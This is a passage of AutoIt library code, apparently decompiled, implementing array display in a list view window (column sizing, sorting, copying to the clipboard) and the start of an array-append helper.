    $_g_arraydisplay_hlistview = GUICtrlGetHandle($idlistview)
    GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_gridlines, $_arrayconstant_lvs_ex_gridlines)
    GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_fullrowselect, $_arrayconstant_lvs_ex_fullrowselect)
    GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_doublebuffer, $_arrayconstant_lvs_ex_doublebuffer)
    GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_ws_ex_clientedge, $_arrayconstant_ws_ex_clientedge)
    Local $hheader = HWnd(GUICtrlSendMsg($idlistview, (0x1000 + 0x1f), 0x0, 0x0))
    GUICtrlSetResizing($idlistview, $_arrayconstant_gui_dockborders)
    Local $icolfill = $_g_arraydisplay_ncols + $_g_arraydisplay_idisplayrow
    If $icolalign Then
        For $i = 0x0 To $icolfill + 0xffffffff
            __ARRAYDISPLAY_JUSTIFYCOLUMN($idlistview, $i, $icolalign / 0x2)
        Next
    EndIf
    GUICtrlSendMsg($idlistview, (0x1000 + 0x2f), $_g_arraydisplay_nrows, 0x0)
    Local $trect = DllStructCreate("struct; long Left;long Top;long Right;long Bottom; endstruct")
    DllCall("user32.dll", "struct*", "SendMessageW", "hwnd", $_g_arraydisplay_hlistview, "uint", $_arrayconstant_lvm_getitemrect, "wparam", 0x0, "struct*", $trect)
    Local $aiwin_pos = WinGetPos($hgui)
    Local $ailv_pos = ControlGetPos($hgui, "", $idlistview)
    $iheight = (($_g_arraydisplay_nrows + 0x3) * (DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top"))) + $aiwin_pos[0x3] - $ailv_pos[0x3]
    If $iheight > @DesktopHeight + 0xffffff9c Then
        $iheight = @DesktopHeight + 0xffffff9c
    ElseIf $iheight < $iminsize Then
        $iheight = $iminsize
    EndIf
    If $iverbose Then SplashOff()
    $_g_arraydisplay_isortdir = 0x400
    Local $icolumn = 0x0, $icolumnprev = +0xffffffff
    If $_g_arraydisplay_idisplayrow Then
        $icolumnprev = $icolumn
        __ARRAYDISPLAY_HEADERSETITEMFORMAT($hheader, $icolumn, 0x4000 + $_g_arraydisplay_isortdir + $icolalign / 0x2)
    EndIf
    $_g_arraydisplay_aindex = $_g_arraydisplay_aindexes[0x0]
    #EndRegion GUI and Listview generation
    Local $p__arraydisplay_notifyhandler = DllCallbackGetPtr(DllCallbackRegister("__ArrayDisplay_NotifyHandler", "lresult", "hwnd;uint;wparam;lparam;uint_ptr;dword_ptr"))
    DllCall("comctl32.dll", "bool", "SetWindowSubclass", "hwnd", $hgui, "ptr", $p__arraydisplay_notifyhandler, "uint_ptr", 0x0, "dword_ptr", 0x0)
    #Region Adjust dialog width
    Local $iwidth = 0x28, $icolwidth = 0x0, $aicolwidth[$icolfill]
    Local $icolwidthheader, $imin_colw = 0x37
    For $i = 0x0 To $icolfill + 0xffffffff
        If $i > 0x0 Then $imin_colw = $imin_colwidth
        GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, +0xffffffff)
        $icolwidth = GUICtrlSendMsg($idlistview, (0x1000 + 0x1d), $i, 0x0)
        If $sheader <> "" Then
            If $icolwidth = 0x0 Then ExitLoop
            GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, +0xfffffffe)
            $icolwidthheader = GUICtrlSendMsg($idlistview, (0x1000 + 0x1d), $i, 0x0)
            If $icolwidth < $imin_colw And $icolwidthheader < $imin_colw Then
                GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, $imin_colw)
                $icolwidth = $imin_colw
            ElseIf $icolwidthheader < $icolwidth Then
                GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, $icolwidth)
            Else
                $icolwidth = $icolwidthheader
            EndIf
        Else
            If $icolwidth < $imin_colw Then
                GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, $imin_colw)
                $icolwidth = $imin_colw
            EndIf
        EndIf
        $iwidth += $icolwidth
        $aicolwidth[$i] = $icolwidth
    Next
    If $iwidth > @DesktopWidth + 0xffffff9c Then
        $iwidth = 0x28
        For $i = 0x0 To $icolfill + 0xffffffff
            If $aicolwidth[$i] > $imax_colwidth Then
                GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, $imax_colwidth)
                $iwidth += $imax_colwidth
            Else
                $iwidth += $aicolwidth[$i]
            EndIf
            If $i < 0x14 And $bdebug Then ConsoleWrite("@@ Debug(" & @ScriptLineNumber & ") : $iWidth = " & $iwidth & " $i = " & $i & @CRLF)
        Next
    EndIf
    If $iwidth > @DesktopWidth + 0xffffff9c Then
        $iwidth = @DesktopWidth + 0xffffff9c
    ElseIf $iwidth < $iminsize Then
        $iwidth = $iminsize
    EndIf
    #EndRegion Adjust dialog width
    Local $iscrollbarsize = 0x0
    If $iheight = (@DesktopHeight + 0xffffff9c) Then $iscrollbarsize = 0xf
    WinMove($hgui, "", (@DesktopWidth - $iwidth + $iscrollbarsize) / 0x2, (@DesktopHeight - $iheight) / 0x2, $iwidth + $iscrollbarsize, $iheight)
    $aiguisize = WinGetClientSize($hgui)
    GUICtrlSetPos($idlistview, 0x0, 0x0, $iwidth, $aiguisize[0x1] - $ibuttonborder)
    #Region Create bottom infos
    Local $ibuttonwidth_1 = $aiguisize[0x0] / 0x2
    Local $ibuttonwidth_2 = $aiguisize[0x0] / 0x3
    Local $idcopy_id = 0x270f, $idcopy_data = 0x1869f, $iddata_label = 0x1869f, $iduser_func = 0x1869f, $idexit_script = 0x1869f
    If $bdebug Then
        $idcopy_id = GUICtrlCreateButton("Copy Data && Hdr/Row", 0x0, $aiguisize[0x1] - $ibuttonborder, $ibuttonwidth_1, 0x14)
        $idcopy_data = GUICtrlCreateButton("Copy Data Only", $ibuttonwidth_1, $aiguisize[0x1] - $ibuttonborder, $ibuttonwidth_1, 0x14)
        Local $ibuttonwidth_var = $ibuttonwidth_1
        Local $ioffset = $ibuttonwidth_1
        If IsFunc($huser_function) Then
            $iduser_func = GUICtrlCreateButton("Run User Func", $ibuttonwidth_2, $aiguisize[0x1] + 0xffffffec, $ibuttonwidth_2, 0x14)
            $ibuttonwidth_var = $ibuttonwidth_2
            $ioffset = $ibuttonwidth_2 * 0x2
        EndIf
        $idexit_script = GUICtrlCreateButton("Exit Script", $ioffset, $aiguisize[0x1] + 0xffffffec, $ibuttonwidth_var, 0x14)
        $iddata_label = GUICtrlCreateLabel($sdisplaydata, 0x0, $aiguisize[0x1] + 0xffffffec, $ibuttonwidth_var, 0x12, BitOR($_arrayconstant_ss_center, $_arrayconstant_ss_centerimage))
    Else
        $iddata_label = GUICtrlCreateLabel($sdisplaydata, 0x0, $aiguisize[0x1] + 0xffffffec, $aiguisize[0x0], 0x12, BitOR($_arrayconstant_ss_center, $_arrayconstant_ss_centerimage))
    EndIf
    If $_g_arraydisplay_itranspose Or $sarrayrange Then
        GUICtrlSetColor($iddata_label, 0xff0000)
        GUICtrlSetTip($iddata_label, $stipdata)
    EndIf
    GUICtrlSetResizing($idcopy_id, $_arrayconstant_gui_dockleft + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
    GUICtrlSetResizing($idcopy_data, $_arrayconstant_gui_dockright + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
    GUICtrlSetResizing($iddata_label, $_arrayconstant_gui_dockleft + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
    GUICtrlSetResizing($iduser_func, $_arrayconstant_gui_dockhcenter + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
    GUICtrlSetResizing($idexit_script, $_arrayconstant_gui_dockright + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
    #EndRegion Create bottom infos
    GUISetState(@SW_SHOW, $hgui)
    If $ftimer > 0x3e8 And Not $sarrayrange Then
        Beep(0x2ee, 0xfa)
        ToolTip("Sorting Action can take as long as " & Ceiling($ftimer / 0x3e8) & " sec" & @CRLF & @CRLF & "Please be patient when you click to sort a column", 0x32, 0x32, $smsgboxtitle, $tip_warningicon, $tip_balloon)
        Sleep(0xbb8)
        ToolTip("")
    EndIf
    #Region GUI Handling events
    Local $ioneventmode = Opt("GUIOnEventMode", 0x0), $amsg
    While 0x1
        $amsg = GUIGetMsg($_arrayconstant_gui_event_array)
        If $amsg[0x1] = $hgui Then
            Switch $amsg[0x0]
                Case $_arrayconstant_gui_event_close
                    ExitLoop
                Case $idcopy_id, $idcopy_data
                    Local $isel_count = GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getselectedcount, 0x0, 0x0)
                    If $iverbose And (Not $isel_count) And ($_g_arraydisplay_iitem_end - $_g_arraydisplay_iitem_start) * ($_g_arraydisplay_isubitem_end - $_g_arraydisplay_isubitem_start) > 0x2710 Then
                        SplashTextOn($smsgboxtitle, "Copying data" & @CRLF & @CRLF & "Please be patient", 0x12c, 0x64)
                    EndIf
                    Local $sclip = "", $sitem, $asplit, $ifirstcol = 0x0
                    If $amsg[0x0] = $idcopy_data And $_g_arraydisplay_idisplayrow Then $ifirstcol = 0x1
                    For $i = 0x0 To GUICtrlSendMsg($idlistview, 0x1004, 0x0, 0x0) + 0xffffffff
                        If $isel_count And Not (GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getitemstate, $i, $_arrayconstant_lvis_selected) <> 0x0) Then
                            ContinueLoop
                        EndIf
                        $sitem = __ARRAYDISPLAY_GETITEMTEXTSTRINGSELECTED($idlistview, $i, $ifirstcol)
                        If $amsg[0x0] = $idcopy_id And Not $_g_arraydisplay_idisplayrow Then
                            $sitem = $arraydisplay_rowprefix & " " & ($i + $_g_arraydisplay_iitem_start) & $scurr_separator & $sitem
                        EndIf
                        If $icw_colwidth Then
                            $asplit = StringSplit($sitem, $scurr_separator)
                            $sitem = ""
                            For $j = 0x1 To $asplit[0x0]
                                $sitem &= StringFormat("%-" & $icw_colwidth + 0x1 & "s", StringLeft($asplit[$j], $icw_colwidth))
                            Next
                        Else
                            $sitem = StringReplace($sitem, $scurr_separator, $vuser_separator)
                        EndIf
                        $sclip &= $sitem & @CRLF
                    Next
                    $sitem = $sheader
                    If $amsg[0x0] = $idcopy_id Then
                        $sitem = $sheader
                        If Not $_g_arraydisplay_idisplayrow Then
                            $sitem = "Row" & $scurr_separator & $sitem
                        EndIf
                        If $icw_colwidth Then
                            $asplit = StringSplit($sitem, $scurr_separator)
                            $sitem = ""
                            For $j = 0x1 To $asplit[0x0]
                                $sitem &= StringFormat("%-" & $icw_colwidth + 0x1 & "s", StringLeft($asplit[$j], $icw_colwidth))
                            Next
                        Else
                            $sitem = StringReplace($sitem, $scurr_separator, $vuser_separator)
                        EndIf
                        $sclip = $sitem & @CRLF & $sclip
                    EndIf
                    ClipPut($sclip)
                    SplashOff()
                    GUICtrlSetState($idlistview, $_arrayconstant_gui_focus)
                Case $idlistview
                    $icolumn = GUICtrlGetState($idlistview)
                    If Not IsArray($_g_arraydisplay_aindexes[$icolumn + Not $_g_arraydisplay_idisplayrow]) Then
                        __ARRAYDISPLAY_SORTINDEXES($icolumn + Not $_g_arraydisplay_idisplayrow)
                    EndIf
                    If $icolumn <> $icolumnprev Then
                        __ARRAYDISPLAY_HEADERSETITEMFORMAT($hheader, $icolumnprev, 0x4000 + $icolalign / 0x2)
                        If $_g_arraydisplay_idisplayrow And $icolumn = 0x0 Then
                            $_g_arraydisplay_aindex = $_g_arraydisplay_aindexes[0x0]
                        Else
                            $_g_arraydisplay_aindex = $_g_arraydisplay_aindexes[$icolumn + Not $_g_arraydisplay_idisplayrow]
                        EndIf
                    EndIf
                    $_g_arraydisplay_isortdir = ($icolumn = $icolumnprev) ? $_g_arraydisplay_isortdir = 0x400 ? 0x200 : 0x400 : 0x400
                    __ARRAYDISPLAY_HEADERSETITEMFORMAT($hheader, $icolumn, 0x4000 + $_g_arraydisplay_isortdir + $icolalign / 0x2)
                    GUICtrlSendMsg($idlistview, (0x1000 + 0x8c), $icolumn, 0x0)
                    GUICtrlSendMsg($idlistview, (0x1000 + 0x2f), $_g_arraydisplay_nrows, 0x0)
                    $icolumnprev = $icolumn
                Case $iduser_func
                    Local $aiselitems[0x1] = [0x0]
                    For $i = 0x0 To GUICtrlSendMsg($idlistview, 0x1004, 0x0, 0x0) + 0xffffffff
                        If (GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getitemstate, $i, $_arrayconstant_lvis_selected) <> 0x0) Then
                            $aiselitems[0x0] += 0x1
                            ReDim $aiselitems[$aiselitems[0x0] + 0x1]
                            $aiselitems[$aiselitems[0x0]] = $i + $_g_arraydisplay_iitem_start
                        EndIf
                    Next
                    $HUSER_FUNCTION($_g_arraydisplay_aarray, $aiselitems)
                    $_g_arraydisplay_buserfunc = False
                    __ARRAYDISPLAY_CLEANUP($hgui, $icoordmode, $ioneventmode, $_icallererror, $_icallerextended, $p__arraydisplay_notifyhandler)
                    Return SetError($_icallererror, $_icallerextended, +0xffffffff)
                Case $idexit_script
                    GUIDelete($hgui)
                    Exit
            EndSwitch
        EndIf
    WEnd
    #EndRegion GUI Handling events
    __ARRAYDISPLAY_CLEANUP($hgui, $icoordmode, $ioneventmode, $_icallererror, $_icallerextended, $p__arraydisplay_notifyhandler)
    Return SetError($_icallererror, $_icallerextended, 0x1)
EndFunc   ;==>__ARRAYDISPLAY_SHARE
Func __ARRAYDISPLAY_CLEANUP($hgui, $icoordmode, $ioneventmode, $_icallererror, $_icallerextended, $p__arraydisplay_notifyhandler)
    DllCall("comctl32.dll", "bool", "RemoveWindowSubclass", "hwnd", $hgui, "ptr", $p__arraydisplay_notifyhandler, "uint_ptr", 0x0)
    $_g_arraydisplay_aindex = 0x0
    Dim $_g_arraydisplay_aindexes[0x1]
    GUIDelete($hgui)
    Opt("GUICoordMode", $icoordmode)
    Opt("GUIOnEventMode", $ioneventmode)
    Return SetError($_icallererror, $_icallerextended, 0x1)
EndFunc   ;==>__ARRAYDISPLAY_CLEANUP
Func __ARRAYDISPLAY_NOTIFYHANDLER($hwnd, $imsg, $wparam, $lparam, $isubclassid, $pdata)
    If $imsg <> 0x4e Then Return DllCall("comctl32.dll", "lresult", "DefSubclassProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)[0x0]
    Local Static $tagnmhdr = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
    Local Static $tagnmlvdispinfo = $tagnmhdr & ";" & $_arrayconstant_taglvitem
    Local $tnmlvdispinfo = DllStructCreate($tagnmlvdispinfo, $lparam)
    Switch HWnd(DllStructGetData($tnmlvdispinfo, "hWndFrom"))
        Case $_g_arraydisplay_hlistview
            Switch DllStructGetData($tnmlvdispinfo, "Code")
                Case +0xffffff4f
                    Local Static $ttext = DllStructCreate("wchar[4096]"), $ptext = DllStructGetPtr($ttext)
                    Local $iitem = DllStructGetData($tnmlvdispinfo, "Item")
                    Local $irow = ($_g_arraydisplay_isortdir = 0x400) ? $_g_arraydisplay_aindex[$iitem] : $_g_arraydisplay_aindex[$_g_arraydisplay_nrows + 0xffffffff - $iitem]
                    Local $icol = DllStructGetData($tnmlvdispinfo, "SubItem")
                    Local $stemp
                    If $_g_arraydisplay_idisplayrow = 0x0 Then
                        $stemp = __ARRAYDISPLAY_GETDATA($irow, $icol)
                        DllStructSetData($ttext, 0x1, $stemp)
                        DllStructSetData($tnmlvdispinfo, "Text", $ptext)
                    Else
                        If $icol = 0x0 Then
                            If $_g_arraydisplay_itranspose Then
                                Local $scaptioncplt = ""
                                If $irow + $_g_arraydisplay_iitem_start < UBound($_g_arraydisplay_asheader) And StringStripWS($_g_arraydisplay_asheader[$irow + $_g_arraydisplay_iitem_start], 0x1 + 0x2) <> "" Then
                                    $scaptioncplt = " (" & StringStripWS($_g_arraydisplay_asheader[$irow + $_g_arraydisplay_iitem_start], 0x1 + 0x2)
                                    If StringRight($scaptioncplt, 0x1) = $arraydisplay_numericsort Then $scaptioncplt = StringTrimRight($scaptioncplt, 0x1)
                                    $scaptioncplt &= ")"
                                EndIf
                                DllStructSetData($ttext, 0x1, "Col " & ($irow + $_g_arraydisplay_iitem_start) & $scaptioncplt)
                            Else
                                DllStructSetData($ttext, 0x1, $arraydisplay_rowprefix & " " & $irow + $_g_arraydisplay_iitem_start)
                            EndIf
                            DllStructSetData($tnmlvdispinfo, "Text", $ptext)
                        Else
                            $stemp = __ARRAYDISPLAY_GETDATA($irow, $icol + 0xffffffff)
                            DllStructSetData($ttext, 0x1, $stemp)
                            DllStructSetData($tnmlvdispinfo, "Text", $ptext)
                        EndIf
                    EndIf
                    Return
            EndSwitch
    EndSwitch
    Return DllCall("comctl32.dll", "lresult", "DefSubclassProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)[0x0]
    #forceref $isubclassid, $pdata
EndFunc   ;==>__ARRAYDISPLAY_NOTIFYHANDLER
Func __ARRAYDISPLAY_GETDATA($irow, $icol)
    Local $stemp
    If $_g_arraydisplay_idims = 0x2 Then
        $stemp = $_g_arraydisplay_aarray[$irow][$icol]
    Else
        $stemp = $_g_arraydisplay_aarray[$irow]
    EndIf
    Switch VarGetType($stemp)
        Case "Array"
            Local $ssubscript = ""
            For $i = 0x1 To UBound($stemp, 0x0)
                $ssubscript = "[" & UBound($stemp, $i) & "]"
            Next
            $stemp = "{Array" & $ssubscript & "}"
        Case "Map"
            $stemp = "{Map[" & UBound($stemp) & "]}"
        Case "Object"
            $stemp = "{Object}"
    EndSwitch
    If StringLen($stemp) > 0xfff Then $stemp = StringLeft($stemp, 0xfff)
    Return $stemp
EndFunc   ;==>__ARRAYDISPLAY_GETDATA
Func __ARRAYDISPLAY_SORTINDEXES($icolstart, $icolend = $icolstart)
    Dim $_g_arraydisplay_aindex[$_g_arraydisplay_nrows]
    If $icolend = +0xffffffff Then
        Dim $_g_arraydisplay_aindexes[$_g_arraydisplay_ncols + $_g_arraydisplay_idisplayrow + 0x1]
        For $i = 0x0 To $_g_arraydisplay_nrows + 0xffffffff
            $_g_arraydisplay_aindex[$i] = $i
        Next
        $_g_arraydisplay_aindexes[0x0] = $_g_arraydisplay_aindex
    EndIf
    If $icolstart = +0xffffffff Then
        $icolstart = 0x1
        $icolend = $_g_arraydisplay_ncols
    EndIf
    If $icolstart Then
        Local $tindex
        For $i = $icolstart To $icolend
            $tindex = __ARRAYDISPLAY_GETSORTCOLSTRUCT($_g_arraydisplay_aarray, $i + 0xffffffff)
            For $j = 0x0 To $_g_arraydisplay_nrows + 0xffffffff
                $_g_arraydisplay_aindex[$j] = DllStructGetData($tindex, 0x1, $j + 0x1)
            Next
            $_g_arraydisplay_aindexes[$i] = $_g_arraydisplay_aindex
        Next
    EndIf
EndFunc   ;==>__ARRAYDISPLAY_SORTINDEXES
Func __ARRAYDISPLAY_GETSORTCOLSTRUCT(Const ByRef $aarray, $icol)
    If UBound($aarray, $ubound_dimensions) < 0x1 Or UBound($aarray, $ubound_dimensions) > 0x2 Then
        Return SetError(0x6, 0x0, 0x0)
    EndIf
    Return __ARRAYDISPLAY_SORTARRAYSTRUCT($aarray, $icol)
EndFunc   ;==>__ARRAYDISPLAY_GETSORTCOLSTRUCT
Func __ARRAYDISPLAY_SORTARRAYSTRUCT(Const ByRef $aarray, $icol)
    Local $idims = UBound($aarray, $ubound_dimensions)
    Local $tindex = DllStructCreate("uint[" & $_g_arraydisplay_nrows & "]")
    Local $pindex = DllStructGetPtr($tindex)
    Static $hdll = DllOpen("kernel32.dll")
    Static $hdllcomp = DllOpen("shlwapi.dll")
    Local $lo, $hi, $mi, $r, $nval1, $nval2
    For $i = 0x1 To $_g_arraydisplay_nrows + 0xffffffff
        $lo = 0x0
        $hi = $i + 0xffffffff
        Do
            $mi = Int(($lo + $hi) / 0x2)
            If Not $_g_arraydisplay_itranspose And $_g_arraydisplay_anumericsort[$icol] Then
                If $idims = 0x1 Then
                    $nval1 = Number($aarray[$i])
                    $nval2 = Number($aarray[DllStructGetData($tindex, 0x1, $mi + 0x1)])
                Else
                    $nval1 = Number($aarray[$i][$icol])
                    $nval2 = Number($aarray[DllStructGetData($tindex, 0x1, $mi + 0x1)][$icol])
                EndIf
                $r = $nval1 < $nval2 ? +0xffffffff : $nval1 > $nval2 ? 0x1 : 0x0
            Else
                If $idims = 0x1 Then
                    $r = DllCall($hdllcomp, "int", "StrCmpLogicalW", "wstr", String($aarray[$i]), "wstr", String($aarray[DllStructGetData($tindex, 0x1, $mi + 0x1)]))[0x0]
                Else
                    $r = DllCall($hdllcomp, "int", "StrCmpLogicalW", "wstr", String($aarray[$i][$icol]), "wstr", String($aarray[DllStructGetData($tindex, 0x1, $mi + 0x1)][$icol]))[0x0]
                EndIf
            EndIf
            Switch $r
                Case +0xffffffff
                    $hi = $mi + 0xffffffff
                Case 0x1
                    $lo = $mi + 0x1
                Case 0x0
                    ExitLoop
            EndSwitch
        Until $lo > $hi
        DllCall($hdll, "none", "RtlMoveMemory", "struct*", $pindex + ($mi + 0x1) * 0x4, "struct*", $pindex + $mi * 0x4, "ulong_ptr", ($i - $mi) * 0x4)
        DllStructSetData($tindex, 0x1, $i, $mi + 0x1 + ($lo = $mi + 0x1))
    Next
    Return $tindex
EndFunc   ;==>__ARRAYDISPLAY_SORTARRAYSTRUCT
Func __ARRAYDISPLAY_CREATESUBARRAY()
    Local $nrows = $_g_arraydisplay_iitem_end - $_g_arraydisplay_iitem_start + 0x1
    Local $ncols = $_g_arraydisplay_isubitem_end - $_g_arraydisplay_isubitem_start + 0x1
    Local $irow = +0xffffffff, $icol, $itemp, $atemp
    If $_g_arraydisplay_itranspose Then
        Dim $atemp[$ncols][$nrows]
        For $i = $_g_arraydisplay_iitem_start To $_g_arraydisplay_iitem_end
            $irow += 0x1
            $icol = +0xffffffff
            For $j = $_g_arraydisplay_isubitem_start To $_g_arraydisplay_isubitem_end
                $icol += 0x1
                $atemp[$icol][$irow] = $_g_arraydisplay_aarray[$i][$j]
            Next
        Next
        $itemp = $_g_arraydisplay_iitem_start
        $_g_arraydisplay_iitem_start = $_g_arraydisplay_isubitem_start
        $_g_arraydisplay_isubitem_start = $itemp
        $itemp = $_g_arraydisplay_iitem_end
        $_g_arraydisplay_iitem_end = $_g_arraydisplay_isubitem_end
        $_g_arraydisplay_isubitem_end = $itemp
        $_g_arraydisplay_nrows = $ncols
        $_g_arraydisplay_ncols = $nrows
    Else
        If $_g_arraydisplay_idims = 0x1 Then
            Dim $atemp[$nrows]
            For $i = $_g_arraydisplay_iitem_start To $_g_arraydisplay_iitem_end
                $irow += 0x1
                $atemp[$irow] = $_g_arraydisplay_aarray[$i]
            Next
        Else
            Dim $atemp[$nrows][$ncols]
            For $i = $_g_arraydisplay_iitem_start To $_g_arraydisplay_iitem_end
                $irow += 0x1
                $icol = +0xffffffff
                For $j = $_g_arraydisplay_isubitem_start To $_g_arraydisplay_isubitem_end
                    $icol += 0x1
                    $atemp[$irow][$icol] = $_g_arraydisplay_aarray[$i][$j]
                Next
            Next
            $_g_arraydisplay_ncols = $ncols
        EndIf
        $_g_arraydisplay_nrows = $nrows
    EndIf
    Return $atemp
EndFunc   ;==>__ARRAYDISPLAY_CREATESUBARRAY
Func __ARRAYDISPLAY_HEADERSETITEMFORMAT($hwnd, $iindex, $iformat)
    Local Static $thditem = DllStructCreate("uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State")
    DllStructSetData($thditem, "Mask", 0x4)
    DllStructSetData($thditem, "Fmt", $iformat)
    Local $aresult = DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $hwnd, "uint", 0x120c, "wparam", $iindex, "struct*", $thditem)
    Return $aresult[0x0] <> 0x0
EndFunc   ;==>__ARRAYDISPLAY_HEADERSETITEMFORMAT
Func __ARRAYDISPLAY_GETITEMTEXT($idlistview, $iindex, $isubitem = 0x0)
    Local $tbuffer = DllStructCreate("wchar Text[4096]")
    Local $pbuffer = DllStructGetPtr($tbuffer)
    Local $titem = DllStructCreate($_arrayconstant_taglvitem)
    DllStructSetData($titem, "SubItem", $isubitem)
    DllStructSetData($titem, "TextMax", 0x1000)
    DllStructSetData($titem, "Text", $pbuffer)
    If IsHWnd($idlistview) Then
        DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $idlistview, "uint", 0x1073, "wparam", $iindex, "struct*", $titem)
    Else
        Local $pitem = DllStructGetPtr($titem)
        GUICtrlSendMsg($idlistview, 0x1073, $iindex, $pitem)
    EndIf
    Return DllStructGetData($tbuffer, "Text")
EndFunc   ;==>__ARRAYDISPLAY_GETITEMTEXT
Func __ARRAYDISPLAY_GETITEMTEXTSTRINGSELECTED($idlistview, $iitem, $ifirstcol)
    Local $srow = "", $sseparatorchar = Opt("GUIDataSeparatorChar")
    Local $iselected = $iitem
    Local $hheader = HWnd(GUICtrlSendMsg($idlistview, 0x101f, 0x0, 0x0))
    Local $ncol = DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $hheader, "uint", 0x1200, "wparam", 0x0, "lparam", 0x0)[0x0]
    For $x = $ifirstcol To $ncol + 0xffffffff
        $srow &= __ARRAYDISPLAY_GETITEMTEXT($idlistview, $iselected, $x) & $sseparatorchar
    Next
    Return StringTrimRight($srow, 0x1)
EndFunc   ;==>__ARRAYDISPLAY_GETITEMTEXTSTRINGSELECTED
Func __ARRAYDISPLAY_JUSTIFYCOLUMN($idlistview, $iindex, $ialign = +0xffffffff)
    Local $tcolumn = DllStructCreate("uint Mask;int Fmt;int CX;ptr Text;int TextMax;int SubItem;int Image;int Order;int cxMin;int cxDefault;int cxIdeal")
    If $ialign < 0x0 Or $ialign > 0x2 Then $ialign = 0x0
    DllStructSetData($tcolumn, "Mask", 0x1)
    DllStructSetData($tcolumn, "Fmt", $ialign)
    Local $pcolumn = DllStructGetPtr($tcolumn)
    Local $iret = GUICtrlSendMsg($idlistview, 0x1060, $iindex, $pcolumn)
    Return $iret <> 0x0
EndFunc   ;==>__ARRAYDISPLAY_JUSTIFYCOLUMN
Global Enum $arrayfill_force_default, $arrayfill_force_singleitem, $arrayfill_force_int, $arrayfill_force_number, $arrayfill_force_ptr, $arrayfill_force_hwnd, $arrayfill_force_string, $arrayfill_force_boolean
Global Enum $arrayunique_nocount, $arrayunique_count
Global Enum $arrayunique_auto, $arrayunique_force32, $arrayunique_force64, $arrayunique_match, $arrayunique_distinct
Func _ArrayAdd(ByRef $aarray, $vvalue, $istart = 0x0, $sdelim_item = "|", $sdelim_row = @CRLF, $iforce = $arrayfill_force_default)
    If $istart = Default Then $istart = 0x0
    If $sdelim_item = Default Then $sdelim_item = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $iforce = Default Then $iforce = $arrayfill_force_default
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows)
    Local $hdatatype = 0x0
    Switch $iforce
        Case $arrayfill_force_int
            $hdatatype = INT
        Case $arrayfill_force_number
            $hdatatype = NUMBER
        Case $arrayfill_force_ptr
            $hdatatype = PTR
        Case $arrayfill_force_hwnd
            $hdatatype = HWND
        Case $arrayfill_force_string
            $hdatatype = STRING
        Case $arrayfill_force_boolean
            $hdatatype = "Boolean"
    EndSwitch
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            If $iforce = $arrayfill_force_singleitem Then
                ReDim $aarray[$idim_1 + 0x1]
                $aarray[$idim_1] = $vvalue
                Return $idim_1
            EndIf
            If IsArray($vvalue) Then
                If UBound($vvalue, $ubound_dimensions) <> 0x1 Then Return SetError(0x5, 0x0, +0xffffffff)
                $hdatatype = 0x0
            Else
                Local $atmp = StringSplit($vvalue, $sdelim_item, $str_nocount + $str_entiresplit)
                If UBound($atmp, $ubound_rows) = 0x1 Then
                    $atmp[0x0] = $vvalue
                EndIf
                $vvalue = $atmp
            EndIf
            Local $iadd = UBound($vvalue, $ubound_rows)
            ReDim $aarray[$idim_1 + $iadd]
            For $i = 0x0 To $iadd + 0xffffffff
                If String($hdatatype) = "Boolean" Then
                    Switch $vvalue[$i]
                        Case "True", "1"
                            $aarray[$idim_1 + $i] = True
                        Case "False", "0", ""
                            $aarray[$idim_1 + $i] = False
                    EndSwitch
                ElseIf IsFunc($hdatatype) Then
                    $aarray[$idim_1 + $i] = $HDATATYPE($vvalue[$i])
                Else
                    $aarray[$idim_1 + $i] = $vvalue[$i]
                EndIf
            Next
            Return $idim_1 + $iadd + 0xffffffff
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns)
            If $istart < 0x0 Or $istart > $idim_2 + 0xffffffff Then Return SetError(0x4, 0x0, +0xffffffff)
            Local $ivaldim_1, $ivaldim_2 = 0x0, $icolcount
            If IsArray($vvalue) Then
                If UBound($vvalue, $ubound_dimensions) <> 0x2 Then Return SetError(0x5, 0x0, +0xffffffff)
                $ivaldim_1 = UBound($vvalue, $ubound_rows)
                $ivaldim_2 = UBound($vvalue, $ubound_columns)
                $hdatatype = 0x0
            Else
                Local $asplit_1 = StringSplit($vvalue, $sdelim_row, $str_nocount + $str_entiresplit)
                $ivaldim_1 = UBound($asplit_1, $ubound_rows)
                Local $atmp[$ivaldim_1][0x0], $asplit_2
                For $i = 0x0 To $ivaldim_1 + 0xffffffff
                    $asplit_2 = StringSplit($asplit_1[$i], $sdelim_item, $str_nocount + $str_entiresplit)
                    $icolcount = UBound($asplit_2)
                    If $icolcount > $ivaldim_2 Then
                        $ivaldim_2 = $icolcount
